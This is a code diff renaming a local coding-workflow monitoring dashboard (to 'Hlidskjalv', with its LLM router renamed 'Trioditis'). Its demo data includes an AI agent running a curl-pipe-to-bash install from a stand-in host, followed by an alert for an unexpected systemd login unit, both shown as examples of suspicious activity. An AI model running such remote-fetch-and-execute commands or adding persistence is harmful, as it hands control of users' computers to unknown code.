@@ -1,4 +1,4 @@
-<title>Workflow Arcade</title>
+<title>Hlidskjalv</title>
 <meta name="description" content="A game-like live map of your coding workflow.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&display=swap">
@@ -403,7 +403,7 @@ code { font: calc(12.5px * var(--fz))/1.45 var(--mono); overflow-wrap: anywhere;
   <div class="hud-in">
     <div class="logo" data-tip="logo">
       <svg viewBox="0 0 32 32" aria-hidden="true"><rect x="2" y="2" width="28" height="28" rx="8" fill="var(--accent)"/><path d="M9 21l4-10 3 7 2-4 5 7" fill="none" stroke="var(--bg)" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      <div>Workflow Arcade<small id="project">loading…</small></div>
+      <div>Hlidskjalv<small id="project">loading…</small></div>
     </div>
     <span class="mode demo" id="mode">Demo</span>
     <div class="level" data-tip="level">
@@ -495,7 +495,7 @@ code { font: calc(12.5px * var(--fz))/1.45 var(--mono); overflow-wrap: anywhere;
       <div class="title">
         <div class="eyebrow">Alerts</div>
         <h2>Things you didn't do yourself</h2>
-        <p>New login items and scheduled jobs, changed shell startup files or SSH keys, requests the Arcade or Switchboard refused, risky commands an AI agent ran, sudo and logins. Most severe first.</p>
+        <p>New login items and scheduled jobs, changed shell startup files or SSH keys, requests Hlidskjalv or Trioditis refused, risky commands an AI agent ran, sudo and logins. Most severe first.</p>
       </div>
     </div>
     <div id="alerts-slot"></div>
@@ -505,7 +505,7 @@ code { font: calc(12.5px * var(--fz))/1.45 var(--mono); overflow-wrap: anywhere;
     <div class="intro">
       <div class="title">
         <div class="eyebrow">Terminal</div>
-        <h2>Your shell, inside the Arcade</h2>
+        <h2>Your shell, inside Hlidskjalv</h2>
         <p>A real terminal in the project folder. Commands typed here show up in the activity log like any other (with the shell hook installed).</p>
       </div>
     </div>
@@ -693,10 +693,10 @@ COMMANDS.python3 = COMMANDS.python; COMMANDS.py = { ...COMMANDS.python, d: "Runs
 COMMANDS.pip3 = COMMANDS.pip;
 const MODULES = {
   venv: "Creates a virtual environment: a private box of libraries for this project only.", pip: "Python's package installer.",
-  pytest: "Runs the automatic tests.", switchboard: "Your LLM router.", workflow_arcade: "This game.", "http.server": "A tiny web server for this folder.",
+  pytest: "Runs the automatic tests.", trioditis: "Your LLM router.", hlidskjalv: "This game.", "http.server": "A tiny web server for this folder.",
   json: "Pretty-prints JSON.",
 };
-const SWITCHBOARD_SUB = { serve: "Starts the router at http://127.0.0.1:8787.", check: "Shows which models are ready.", explain: "Shows which model a prompt would go to, without calling any model." };
+const TRIODITIS_SUB = { serve: "Starts the router at http://127.0.0.1:8787.", check: "Shows which models are ready.", explain: "Shows which model a prompt would go to, without calling any model." };
 const OPS = {
   "&&": "Then: run the next command only if this one worked.", "||": "Or: run the next command only if this one failed.",
   "|": "Pipe: hand this command's output to the next command.", ">": "Save the output to a file, replacing it.", ">>": "Add the output to the end of a file.",
@@ -769,8 +769,8 @@ function explainCommand(cmd) {
       parts.push({ t, cls: "flag", tip: { title: `Option ${t}`, body: fl || "An option that changes how the command behaves." } });
       continue;
     }
-    if (module === "switchboard" && SWITCHBOARD_SUB[low] && !sawSub) {
-      sawSub = true; parts.push({ t, cls: "sub", tip: { title: t, body: SWITCHBOARD_SUB[low] } }); summaries[summaries.length - 1] = SWITCHBOARD_SUB[low].replace(/\.$/, ""); continue;
+    if (module === "trioditis" && TRIODITIS_SUB[low] && !sawSub) {
+      sawSub = true; parts.push({ t, cls: "sub", tip: { title: t, body: TRIODITIS_SUB[low] } }); summaries[summaries.length - 1] = TRIODITIS_SUB[low].replace(/\.$/, ""); continue;
     }
     if (spec && spec.sub && spec.sub[low] && !sawSub) {
       sawSub = true; parts.push({ t, cls: "sub", tip: { title: `${prog} ${t}`, body: spec.sub[low] } });
@@ -846,7 +846,7 @@ const EV = {
   commit: { c: "var(--accent)", why: "A save point. You can always come back to this exact state." },
   branch: { c: "var(--ai)", why: "A branch is a parallel version of the project, handy for trying ideas safely." },
   alert: { c: "var(--sev-high)", why: "Something happened that you didn't do yourself. Check it; mark it seen in Alerts." },
-  ai_call: { c: "var(--ai)", why: "Switchboard picked this model for this step. Local models are free and private; cloud models cost money per token." },
+  ai_call: { c: "var(--ai)", why: "Trioditis picked this model for this step. Local models are free and private; cloud models cost money per token." },
 };
 function eventView(ev) {
   const name = ev.path ? base(ev.path) : "";
@@ -874,14 +874,14 @@ function eventView(ev) {
       title = `AI step: ${ev.route}`; sub = `${ev.model}`; where = `route ${ev.route} → ${ev.model}`;
       chips.push(ev.local ? h("span", { class: "chip ok", tip: { title: "Local model", body: "Ran on your computer: free and private." } }, "local · free")
         : ev.subscription ? h("span", { class: "chip", tip: { title: "Subscription", body: "Ran through Claude Code on your subscription: a flat plan, not billed per token, so there's no per-call cost to show." } }, "subscription")
-        : h("span", { class: "chip ai", tip: { title: "Cloud model", body: "Ran at a provider and is billed per token.", why: ev.cost == null ? "Add prices in ~/.arcade/prices.json to see the cost." : null } }, "cloud · " + money(ev.cost)));
+        : h("span", { class: "chip ai", tip: { title: "Cloud model", body: "Ran at a provider and is billed per token.", why: ev.cost == null ? "Add prices in ~/.hlidskjalv/prices.json to see the cost." : null } }, "cloud · " + money(ev.cost)));
       if (ev.tokens_in != null) chips.push(h("span", { class: "chip", tip: { title: "Tokens", body: `${ev.tokens_in} in (your request and context), ${ev.tokens_out} out (the answer). A token is about ¾ of a word.`, why: ev.tokens_cached ? `${fmt(ev.tokens_cached)} of the input was cached context: re-read from earlier turns, cheaper and faster than new input.` : null } }, `${fmt(ev.tokens_in)} → ${fmt(ev.tokens_out)} tokens`));
       const blocked = (ev.attempts || []).filter(a => a.error === "budget_blocked");
-      if (blocked.length) chips.push(h("span", { class: "chip warn", tip: { title: "Budget guard", body: `Your spending cap was reached (${blocked[0].reason || "budget"}), so Switchboard skipped ${blocked.map(a => a.model).join(", ")} and used a free local model instead.`, where: "Caps: ~/.arcade/budget.json" } }, "budget → local"));
-      if (ev.sensitive && ev.sensitive.length) chips.push(h("span", { class: "chip ok", tip: { title: "Kept private", body: `Switchboard spotted: ${ev.sensitive.join(", ")}. It kept this request on a local model so it never left your computer.` } }, icon("shield"), "kept local"));
+      if (blocked.length) chips.push(h("span", { class: "chip warn", tip: { title: "Budget guard", body: `Your spending cap was reached (${blocked[0].reason || "budget"}), so Trioditis skipped ${blocked.map(a => a.model).join(", ")} and used a free local model instead.`, where: "Caps: ~/.hlidskjalv/budget.json" } }, "budget → local"));
+      if (ev.sensitive && ev.sensitive.length) chips.push(h("span", { class: "chip ok", tip: { title: "Kept private", body: `Trioditis spotted: ${ev.sensitive.join(", ")}. It kept this request on a local model so it never left your computer.` } }, icon("shield"), "kept local"));
       const otherFails = (ev.fallbacks || 0) - blocked.length;
-      if (otherFails > 0) chips.push(h("span", { class: "chip warn", tip: { title: "Fallback", body: `${otherFails} model(s) were busy or down, so Switchboard tried the next one.` } }, `${otherFails} fallback`));
-      if (ev.status === 429 && blocked.length) { chips.push(h("span", { class: "chip bad", tip: { title: "Over budget", body: "The spending cap was reached and this route has no local model to fall back to, so the request was refused instead of billed.", where: "Caps: ~/.arcade/budget.json" } }, "over budget")); tone = "danger"; }
+      if (otherFails > 0) chips.push(h("span", { class: "chip warn", tip: { title: "Fallback", body: `${otherFails} model(s) were busy or down, so Trioditis tried the next one.` } }, `${otherFails} fallback`));
+      if (ev.status === 429 && blocked.length) { chips.push(h("span", { class: "chip bad", tip: { title: "Over budget", body: "The spending cap was reached and this route has no local model to fall back to, so the request was refused instead of billed.", where: "Caps: ~/.hlidskjalv/budget.json" } }, "over budget")); tone = "danger"; }
       else if (ev.status && ev.status >= 400) { chips.push(h("span", { class: "chip bad" }, "failed " + ev.status)); tone = "danger"; }
       break;
     }
@@ -920,8 +920,8 @@ const xpOf = ev => ev.actor === "ai" ? 0 : (XP_RULES[ev.type] || 0) + (ev.type =
 
 /* =========================================================== world view */
 function makeWorldView(slot, src) {
-  const ribbon = h("div", { class: "ribbon", tip: { title: "Model ribbon", body: "Shows the last AI step: which route Switchboard chose and which model answered." } },
-    h("i", { class: "beam" }), icon("ai_call"), h("span", { class: "txt muted", text: "No AI steps yet. They appear here when your helper talks to a model through Switchboard, or a Claude Code session runs in this folder." }));
+  const ribbon = h("div", { class: "ribbon", tip: { title: "Model ribbon", body: "Shows the last AI step: which route Trioditis chose and which model answered." } },
+    h("i", { class: "beam" }), icon("ai_call"), h("span", { class: "txt muted", text: "No AI steps yet. They appear here when your helper talks to a model through Trioditis, or a Claude Code session runs in this folder." }));
   const stats = h("div", { class: "stats" });
   const map = h("div", { class: "map" });
   const entries = h("div", { class: "entries" });
@@ -944,7 +944,7 @@ function makeWorldView(slot, src) {
       statBox("AI steps", s.ai, { title: "AI steps", body: `${s.local} local (free, private), ${s.ai - s.local - s.sub} cloud (per token)${s.sub ? `, ${s.sub} on a subscription (Claude Code)` : ""}.` },
         h("div", { class: "ratio" }, h("i", { style: `width:${share}%` }))),
       statBox("tokens", fmt(s.tokens), { title: "Tokens", body: "Total words-ish sent to and received from models." }),
-      statBox("spend", s.costKnown ? money(s.cost) : "–", { title: "Spend", body: s.costKnown ? "Estimated from your prices file. Local models count as $0." : "Add model prices in ~/.arcade/prices.json to see spend." }),
+      statBox("spend", s.costKnown ? money(s.cost) : "–", { title: "Spend", body: s.costKnown ? "Estimated from your prices file. Local models count as $0." : "Add model prices in ~/.hlidskjalv/prices.json to see spend." }),
     );
   }
   function renderMap(w) {
@@ -1036,7 +1036,7 @@ function updateLevel() {
 }
 function toast(text) { const t = h("div", { class: "toast", text }); $("#toasts").append(t); setTimeout(() => t.remove(), 3800); }
 TIPS.set($(".level"), () => ({ title: "Level and XP", body: ["Earn XP for real work: new files +10, edits +5, commands +3, save points +50, AI steps on local models +5, Learn levels +100."], why: "Save points are worth the most: they're what make experiments safe." }));
-TIPS.set($(".logo"), { title: "Workflow Arcade", body: "A live, game-like view of what you and your AI helper do in a project. It only watches; it never changes your files or runs anything.", where: "Runs on your computer at http://127.0.0.1:8788" });
+TIPS.set($(".logo"), { title: "Hlidskjalv", body: "A live, game-like view of what you and your AI helper do in a project. It only watches; it never changes your files or runs anything.", where: "Runs on your computer at http://127.0.0.1:8788" });
 
 /* =========================================================== demo data */
 function demoSession() {
@@ -1072,9 +1072,9 @@ function demoSession() {
     [500, { type: "command", cmd: "git push", cwd: "." }],
     [520, { type: "command", cmd: "curl -s https://get.example.dev/setup.sh | bash", cwd: ".", actor: "ai", agent: "Claude Code", why: "Install the formatter" }],
     [540, { type: "alert", severity: "high", source: "persistence", title: "Login services (systemd user units): added updater.service", detail: "~/.config/systemd/user/updater.service\nPrograms that start at login or on a timer.\n+ExecStart=/home/me/.cache/upd/run.sh", uid: "demo-1", expected: false }],
-    [560, { type: "alert", severity: "medium", source: "refused_access", title: "Switchboard refused a request (invalid or missing API key)", detail: "POST /v1/chat/completions from 127.0.0.1", uid: "demo-2", expected: false }],
+    [560, { type: "alert", severity: "medium", source: "refused_access", title: "Trioditis refused a request (invalid or missing API key)", detail: "POST /v1/chat/completions from 127.0.0.1", uid: "demo-2", expected: false }],
   ];
-  const snap = { type: "snapshot", ts: t0, project: "weather-bot (example)", files, git: true, branch: "main", commands_hook: true, switchboard: true };
+  const snap = { type: "snapshot", ts: t0, project: "weather-bot (example)", files, git: true, branch: "main", commands_hook: true, trioditis: true };
   return [snap, ...steps.map(([dt, e], i) => ({ id: i + 1, ts: t0 + dt, ...e }))];
 }
 
@@ -1085,9 +1085,9 @@ function setMode(m) {
   mode = m; const el = $("#mode");
   el.className = "mode " + (m === "live" ? "live" : m === "off" ? "off" : "demo");
   el.textContent = m === "live" ? "Live" : m === "off" ? "Reconnecting" : "Demo";
-  TIPS.set(el, m === "demo" ? { title: "Demo mode", body: "You're watching an example session (made-up project and numbers). Run the Arcade on your computer to see your own work.", where: "python -m workflow_arcade watch <project folder>" }
-    : m === "live" ? { title: "Live", body: "Connected to the Arcade on your computer. Changes appear within a second." }
-    : { title: "Reconnecting", body: "Lost the connection to the Arcade on your computer. Is it still running?" });
+  TIPS.set(el, m === "demo" ? { title: "Demo mode", body: "You're watching an example session (made-up project and numbers). Run Hlidskjalv on your computer to see your own work.", where: "python -m hlidskjalv watch <project folder>" }
+    : m === "live" ? { title: "Live", body: "Connected to Hlidskjalv on your computer. Changes appear within a second." }
+    : { title: "Reconnecting", body: "Lost the connection to Hlidskjalv on your computer. Is it still running?" });
   el.setAttribute("data-tip", "");
 }
 function sourceChips(snap) {
@@ -1095,10 +1095,10 @@ function sourceChips(snap) {
   $("#sources").replaceChildren(
     chip(true, "Files", "Watching every file in the project folder, except build and library folders."),
     chip(snap.git, "Git", "Watching save points and branches.", { body: "This folder isn't a Git project yet. Run git init to start saving points.", where: "git init" }),
-    chip(snap.commands_hook, "Terminal", "Recording commands typed in this project's folder. Start a command with a space to keep it private.", { body: "Add the small shell hook to see commands here.", where: "python -m workflow_arcade hook bash >> ~/.bashrc" }),
-    chip(snap.switchboard, "AI", "Reading Switchboard's log: route, model, tokens. Never your prompts.", { body: "Start the Arcade with --switchboard-log to see AI steps.", where: "--switchboard-log ~/switchboard/logs/decisions.jsonl" }),
+    chip(snap.commands_hook, "Terminal", "Recording commands typed in this project's folder. Start a command with a space to keep it private.", { body: "Add the small shell hook to see commands here.", where: "python -m hlidskjalv hook bash >> ~/.bashrc" }),
+    chip(snap.trioditis, "AI", "Reading Trioditis's log: route, model, tokens. Never your prompts.", { body: "Start Hlidskjalv with --trioditis-log to see AI steps.", where: "--trioditis-log ~/trioditis/logs/decisions.jsonl" }),
     chip(snap.claude_code, "Claude Code", "Reading Claude Code's own session transcripts for this folder: model and tokens only, never text.", { body: "No Claude Code sessions for this folder yet. Run claude here and its steps appear.", where: "claude" }),
-    chip(snap.terminal, "Shell", "The Terminal tab runs a real shell in this folder.", { body: "The in-browser terminal is off. Start the Arcade with --terminal to switch it on.", where: "python -m workflow_arcade watch <folder> --terminal" }),
+    chip(snap.terminal, "Shell", "The Terminal tab runs a real shell in this folder.", { body: "The in-browser terminal is off. Start Hlidskjalv with --terminal to switch it on.", where: "python -m hlidskjalv watch <folder> --terminal" }),
   );
 }
 function startWorld(snap, events) {
@@ -1211,7 +1211,7 @@ const LESSONS = [
   { id: "terminal", n: 1, c: "var(--info)", title: "Find your way", tag: "The terminal: folders and files",
     intro: "The terminal is a text window for giving your computer instructions. You're always standing in one folder.",
     cmds: [
-      ["Where am I?", "pwd", "Get-Location"], ["What's here?", "ls", "dir"], ["Walk into a folder", "cd switchboard", "cd switchboard"],
+      ["Where am I?", "pwd", "Get-Location"], ["What's here?", "ls", "dir"], ["Walk into a folder", "cd trioditis", "cd trioditis"],
       ["Go up one level", "cd ..", "cd .."], ["Make a folder", "mkdir my-project", "mkdir my-project"], ["Open it in VS Code", "code .", "code ."],
     ],
     quiz: [["What does cd .. do?", ["Deletes the folder", "Moves you up one folder", "Lists files"], 1, "Two dots always mean the folder above."],
@@ -1245,16 +1245,16 @@ const LESSONS = [
     quiz: [["The AI wants to run rm -rf build. What do you do first?", ["Approve quickly", "Check what it deletes. rm -rf removes for good", "Restart VS Code"], 1, "Read Careful badges before approving."],
       ["Where should API keys live?", ["In the chat with the AI", "In .env, which .gitignore keeps out of Git", "In README.md"], 1, "Never paste keys into chats or code."],
       ["The AI made a mess of a file. Fastest safe undo?", ["git restore <file>", "Delete the project", "Buy a new laptop"], 0, "Restores the file to your last save point."]] },
-  { id: "switchboard", n: 5, c: "var(--danger)", title: "Your Switchboard", tag: "Cheap where possible, smart where needed",
-    intro: "Switchboard sends each AI request to the right model: free local models for easy steps, paid cloud models for hard ones.",
+  { id: "trioditis", n: 5, c: "var(--danger)", title: "Your Trioditis", tag: "Cheap where possible, smart where needed",
+    intro: "Trioditis sends each AI request to the right model: free local models for easy steps, paid cloud models for hard ones.",
     cmds: [
-      ["Download a local model", "ollama pull qwen2.5-coder:7b", "ollama pull qwen2.5-coder:7b"], ["Which models are ready?", "python -m switchboard check", "python -m switchboard check"],
-      ["Where would this prompt go?", "python -m switchboard explain \"fix my python bug\"", "python -m switchboard explain \"fix my python bug\""],
-      ["Start the router", "python -m switchboard serve", "python -m switchboard serve"],
+      ["Download a local model", "ollama pull qwen2.5-coder:7b", "ollama pull qwen2.5-coder:7b"], ["Which models are ready?", "python -m trioditis check", "python -m trioditis check"],
+      ["Where would this prompt go?", "python -m trioditis explain \"fix my python bug\"", "python -m trioditis explain \"fix my python bug\""],
+      ["Start the router", "python -m trioditis serve", "python -m trioditis serve"],
     ],
     quiz: [["What does explain do?", ["Calls the model", "Shows which model would be picked, without calling it", "Deletes the config"], 1, "A free dry run."],
       ["Which model answers when a prompt contains an API key?", ["The cheapest cloud model", "A local model, or none at all", "Every model"], 1, "Private data never leaves your computer."],
-      ["Which address do you give Cline?", ["http://127.0.0.1:8787/v1", "https://api.openai.com", "github.com"], 0, "Your local Switchboard."]] },
+      ["Which address do you give Cline?", ["http://127.0.0.1:8787/v1", "https://api.openai.com", "github.com"], 0, "Your local Trioditis."]] },
 ];
 function renderLevels() {
   const done = store.get("academy", {});
@@ -1302,7 +1302,7 @@ $("#dec-ex").append(...["pip install --require-hashes -r requirements.txt", "rm 
 const BADGES = [
   ["First save point", "Make your first Git commit.", () => world && world.stats.commits >= 1],
   ["Local hero", "Have 3 AI steps answered by free local models.", () => world && world.stats.local >= 3],
-  ["Secret keeper", "Switchboard kept a request with private data on your computer.", () => world && world.stats.keptLocal >= 1],
+  ["Secret keeper", "Trioditis kept a request with private data on your computer.", () => world && world.stats.keptLocal >= 1],
   ["Builder", "Make 5 edits in one session.", () => world && world.stats.edits >= 5],
   ["Tested", "Run the automatic checks (pytest).", () => world && [...worldView.entries.querySelectorAll(".cmd")].some(c => /pytest/.test(c.textContent))],
   ["Graduate", "Finish all five Learn levels.", () => Object.values(store.get("academy", {})).filter(Boolean).length >= LESSONS.length],
@@ -1353,12 +1353,12 @@ function billingOf(m) { return m.local ? "local · free" : m.sub ? "subscription
 function efficiencyTips(sum) {
   const { t, routes } = sum, tips = [];
   if (!t.calls) return [["", "No AI steps yet in this session. Tips about cost appear here once there are some."]];
-  if (t.cloud + t.local) tips.push(["ok", `${Math.round((t.local / Math.max(1, t.local + t.cloud)) * 100)}% of Switchboard's AI steps ran on free local models.`, "Every step a local model can handle well is a step you don't pay for, and it never leaves your computer."]);
+  if (t.cloud + t.local) tips.push(["ok", `${Math.round((t.local / Math.max(1, t.local + t.cloud)) * 100)}% of Trioditis's AI steps ran on free local models.`, "Every step a local model can handle well is a step you don't pay for, and it never leaves your computer."]);
   for (const r of routes.filter(r => r.cloud).sort((a, b) => b.cost - a.cost).slice(0, 3))
     tips.push(["warn", `Route ${r.route}: ${r.cloud} cloud call${r.cloud === 1 ? "" : "s"}${r.cost ? ` (${money(r.cost)})` : ""}, ${r.local} local.`,
-      "If routine prompts land here, list a local model first for this route; Switchboard falls back to the cloud model if it fails. See which local models fit your computer:", "python -m switchboard hardware"]);
-  if (t.unpriced) tips.push(["warn", `${t.unpriced} cloud call${t.unpriced === 1 ? " has" : "s have"} no price, so spend and the budget guard can't count ${t.unpriced === 1 ? "it" : "them"}.`, "Add each cloud model's price per million tokens:", "~/.arcade/prices.json"]);
-  if (t.blocked) tips.push(["ok", `The budget guard kept ${t.blocked} call${t.blocked === 1 ? "" : "s"} off paid models.`, "Caps live in a small file; edits apply immediately:", "~/.arcade/budget.json"]);
+      "If routine prompts land here, list a local model first for this route; Trioditis falls back to the cloud model if it fails. See which local models fit your computer:", "python -m trioditis hardware"]);
+  if (t.unpriced) tips.push(["warn", `${t.unpriced} cloud call${t.unpriced === 1 ? " has" : "s have"} no price, so spend and the budget guard can't count ${t.unpriced === 1 ? "it" : "them"}.`, "Add each cloud model's price per million tokens:", "~/.hlidskjalv/prices.json"]);
+  if (t.blocked) tips.push(["ok", `The budget guard kept ${t.blocked} call${t.blocked === 1 ? "" : "s"} off paid models.`, "Caps live in a small file; edits apply immediately:", "~/.hlidskjalv/budget.json"]);
   if (t.sub && t.subIn) tips.push(["ai", `Claude Code: ${Math.round((t.subCached / t.subIn) * 100)}% of its input was cached context (${fmt(t.subCached)} of ${fmt(t.subIn)} tokens).`,
     "Each turn re-reads the whole conversation. Starting a fresh session (or /clear) for a new task keeps that context, and your plan's usage, small."]);
   return tips;
@@ -1425,18 +1425,18 @@ function eventPanel(ev, src) {
     case "branch": rows.push(["Now on", ev.branch], ["Came from", ev.previous]); break;
     case "alert": {
       const what = { persistence: "If you didn't add this yourself, or you don't know the program, look at the file before your next login and remove what you don't recognise.",
-        refused_access: "Nothing got through. If it repeats and isn't one of your own old browser tabs or links, something on this computer is probing the Arcade or Switchboard.",
+        refused_access: "Nothing got through. If it repeats and isn't one of your own old browser tabs or links, something on this computer is probing Hlidskjalv or Trioditis.",
         system_log: "If you didn't run this or log in, change your password and check who has access.",
         ai_commands: "The AI ran this on its own. Check that it did what you asked; in Claude Code you can require approval for such commands." }[ev.source];
       rows.push(["Severity", SEV[ev.severity]?.label || ev.severity], ["Source", ALERT_SOURCES[ev.source]?.label || ev.source, ALERT_SOURCES[ev.source]?.tip],
-        ev.expected && ["Expected", "yes", "The Arcade made this change itself."], ev.data && ev.data.path && ["Where", ev.data.path], ev.data && ev.data.cwd && ["Folder", ev.data.cwd]);
+        ev.expected && ["Expected", "yes", "Hlidskjalv made this change itself."], ev.data && ev.data.path && ["Where", ev.data.path], ev.data && ev.data.cwd && ["Folder", ev.data.cwd]);
       extra.push(h("pre", { class: "raw", text: ev.detail || "" }), what ? h("p", { class: "why", style: "margin:0;color:var(--text)", text: "What to do: " + what }) : null,
         AL.acks.has(ev.uid) ? null : h("button", { type: "button", class: "btn", style: "justify-self:start", onclick: () => ackAlerts([ev.uid]) }, "Mark seen"));
       break;
     }
     case "ai_call": {
       const sub = ev.subscription, blocked = (ev.attempts || []).filter(a => a.error === "budget_blocked");
-      rows.push(["Route", ev.route, sub ? "Claude Code talks to Anthropic directly; Switchboard didn't route this step." : "The kind of task Switchboard decided this was."],
+      rows.push(["Route", ev.route, sub ? "Claude Code talks to Anthropic directly; Trioditis didn't route this step." : "The kind of task Trioditis decided this was."],
         ["Model", ev.model],
         ["Runs on", ev.local ? "your computer" : sub ? "Anthropic, on your subscription" : "a cloud provider", ev.local ? "Free and private: nothing left your computer." : sub ? "A flat plan: no per-call bill, but usage counts toward your plan's limits." : "Billed per token."],
         ["Status", ev.status == null ? "–" : String(ev.status), ev.status >= 400 ? "Failed." : "Answered."],
@@ -1444,12 +1444,12 @@ function eventPanel(ev, src) {
         ["Tokens in", ev.tokens_in != null ? ev.tokens_in.toLocaleString() : "not reported", "Your request plus all the context sent with it."],
         ev.tokens_cached != null && ["of which cached", ev.tokens_cached.toLocaleString(), "Context re-read from earlier turns: cheaper and faster than new input."],
         ["Tokens out", ev.tokens_out != null ? ev.tokens_out.toLocaleString() : "not reported", "The answer. Output tokens usually cost several times more than input."],
-        ["Cost", ev.local ? "$0" : sub ? "included in plan" : ev.cost != null ? money(ev.cost) : "unknown", !ev.local && !sub && ev.cost == null ? "Add this model's prices to ~/.arcade/prices.json." : null],
-        ev.sensitive && ev.sensitive.length && ["Kept private", ev.sensitive.join(", "), "Switchboard spotted private data and kept this request on a local model."]);
+        ["Cost", ev.local ? "$0" : sub ? "included in plan" : ev.cost != null ? money(ev.cost) : "unknown", !ev.local && !sub && ev.cost == null ? "Add this model's prices to ~/.hlidskjalv/prices.json." : null],
+        ev.sensitive && ev.sensitive.length && ["Kept private", ev.sensitive.join(", "), "Trioditis spotted private data and kept this request on a local model."]);
       if (ev.reasons && ev.reasons.length) extra.push(h("div", { class: "eyebrow", text: "Why this model" }), h("ul", { class: "dlist" }, ...ev.reasons.map(r => h("li", { class: "ai", text: r }))));
-      else if (!sub) extra.push(h("p", { class: "muted", text: "Switchboard's reasons for this choice show here for steps logged by a current Switchboard." }));
+      else if (!sub) extra.push(h("p", { class: "muted", text: "Trioditis's reasons for this choice show here for steps logged by a current Trioditis." }));
       if (ev.attempts && ev.attempts.length) extra.push(h("div", { class: "eyebrow", text: "Tried first" }), h("ul", { class: "dlist" }, ...ev.attempts.map(a =>
-        a.error === "budget_blocked" ? h("li", { class: "warn" }, `${a.model}: skipped, over budget`, h("small", { text: (a.reason || "") + ". Caps: ~/.arcade/budget.json" }))
+        a.error === "budget_blocked" ? h("li", { class: "warn" }, `${a.model}: skipped, over budget`, h("small", { text: (a.reason || "") + ". Caps: ~/.hlidskjalv/budget.json" }))
         : a.status ? h("li", { class: "bad" }, `${a.model}: answered ${a.status}`, h("small", { text: a.status === 429 ? "Rate-limited: too many requests." : a.status >= 500 ? "The provider had a problem." : "Not usable for this request." }))
         : h("li", { class: "bad" }, `${a.model}: couldn't connect`, h("small", { text: a.error || "" })))));
       if (blocked.length && ev.status === 429) extra.push(h("p", { class: "warn", text: "Refused rather than billed: the route has no local model to fall back to. Add one, or raise the cap." }));
@@ -1462,7 +1462,7 @@ function eventPanel(ev, src) {
     v.chips.length ? h("div", { class: "meta", style: "display:flex;flex-wrap:wrap;gap:6px" }, ...v.chips) : null,
     kv(rows), ...extra,
     h("p", { class: "why", style: "margin:0;color:var(--ok)", text: c.why }),
-    h("details", {}, h("summary", { text: "Raw event (exactly what the Arcade recorded)" }), h("pre", { class: "raw", text: JSON.stringify(ev, null, 2) })));
+    h("details", {}, h("summary", { text: "Raw event (exactly what Hlidskjalv recorded)" }), h("pre", { class: "raw", text: JSON.stringify(ev, null, 2) })));
 }
 function relatedList(evs, src, empty) {
   return evs.length ? h("ul", { class: "dlist" }, ...evs.slice(-60).reverse().map(ev => { const v = eventView(ev);
@@ -1497,7 +1497,7 @@ function modelPanel(model, src) {
   return panel("Model", model,
     kv([["Runs on", billingOf(m)], ["Calls", m.calls, m.failed ? `${m.failed} failed` : null], ["Routes", [...m.routes].join(", ")],
       ["Tokens", `${fmt(m.tin)} in · ${fmt(m.tout)} out`, m.cached ? `${fmt(m.cached)} of the input was cached context` : null],
-      ["Cost", m.local ? "$0" : m.sub ? "included in plan" : m.priced ? money(m.cost) : "unknown", !m.local && !m.sub && m.priced < m.calls ? "Some calls have no price in ~/.arcade/prices.json." : null],
+      ["Cost", m.local ? "$0" : m.sub ? "included in plan" : m.priced ? money(m.cost) : "unknown", !m.local && !m.sub && m.priced < m.calls ? "Some calls have no price in ~/.hlidskjalv/prices.json." : null],
       m.latN && ["Average time", (m.lat / m.latN / 1000).toFixed(2) + " s"]]),
     h("div", { class: "eyebrow", text: "Calls" }), relatedList(evs, src));
 }
@@ -1552,18 +1552,18 @@ function meter(label, value, cap, period) {
 }
 function budgetPanel(b) {
   if (!b || !b.available) return panel("Spending caps", "Not connected",
-    h("p", { class: "muted", style: "margin:0", text: "Switchboard keeps a call history and daily and monthly caps in ~/.arcade. Start Switchboard (v0.2 or newer) to see them here." }));
+    h("p", { class: "muted", style: "margin:0", text: "Trioditis keeps a call history and daily and monthly caps in ~/.hlidskjalv. Start Trioditis (v0.2 or newer) to see them here." }));
   const ct = b.calls_today || { total: 0, local: 0 };
   return panel("Spending caps", `${money(b.today)} today · ${money(b.month)} this month`,
     meter("Today", b.today, b.caps.daily_usd, "today"), meter("This month", b.month, b.caps.monthly_usd, "this month"),
-    h("p", { class: "muted", style: "margin:0", text: `${ct.total} Switchboard call${ct.total === 1 ? "" : "s"} today, ${ct.local} on free local models.${b.caps_file ? "" : " Caps are the defaults ($1/day, $15/month)."}` }),
+    h("p", { class: "muted", style: "margin:0", text: `${ct.total} Trioditis call${ct.total === 1 ? "" : "s"} today, ${ct.local} on free local models.${b.caps_file ? "" : " Caps are the defaults ($1/day, $15/month)."}` }),
     b.unpriced_today ? h("ul", { class: "dlist" }, h("li", { class: "warn" }, `${b.unpriced_today} cloud call${b.unpriced_today === 1 ? "" : "s"} today had no price, so the caps can't count ${b.unpriced_today === 1 ? "it" : "them"}.`,
-      h("small", { text: `Add ${b.unpriced_models.join(", ") || "those models"} to ~/.arcade/prices.json.` }))) : null,
-    h("div", { class: "cmd", text: "~/.arcade/budget.json  {\"daily_usd\": 1.0, \"monthly_usd\": 15.0}" }));
+      h("small", { text: `Add ${b.unpriced_models.join(", ") || "those models"} to ~/.hlidskjalv/prices.json.` }))) : null,
+    h("div", { class: "cmd", text: "~/.hlidskjalv/budget.json  {\"daily_usd\": 1.0, \"monthly_usd\": 15.0}" }));
 }
 function hardwarePanel(hw) {
   if (!hw || !hw.available) return panel("Local models for this computer", "No report yet",
-    h("p", { class: "muted", style: "margin:0", text: "Switchboard writes a hardware report to ~/.arcade/hardware.json when it starts. Or run: python -m switchboard hardware" }));
+    h("p", { class: "muted", style: "margin:0", text: "Trioditis writes a hardware report to ~/.hlidskjalv/hardware.json when it starts. Or run: python -m trioditis hardware" }));
   const H = hw.hardware || {}, gpu = (H.gpus || [])[0];
   const age = hw.generated_at ? ` · checked ${ago(hw.generated_at)}` : "";
   return panel("Local models for this computer", `~${hw.budget.gb} GB usable for a model${age}`,
@@ -1620,7 +1620,7 @@ const OWNER = {
   forget() { this.key = null; this.paired = false; store.set("ownerKey", null); },
   async post(path, body) {
     const r = await fetch(path, { method: "POST", cache: "no-store",
-      headers: { "Content-Type": "application/json", ...(this.key ? { "X-Arcade-Key": this.key } : {}) },
+      headers: { "Content-Type": "application/json", ...(this.key ? { "X-Hlidskjalv-Key": this.key } : {}) },
       body: JSON.stringify(body || {}) });
     let data = {}; try { data = await r.json(); } catch {}
     if (r.status === 401) this.forget();
@@ -1655,11 +1655,11 @@ function renderTerminal() {
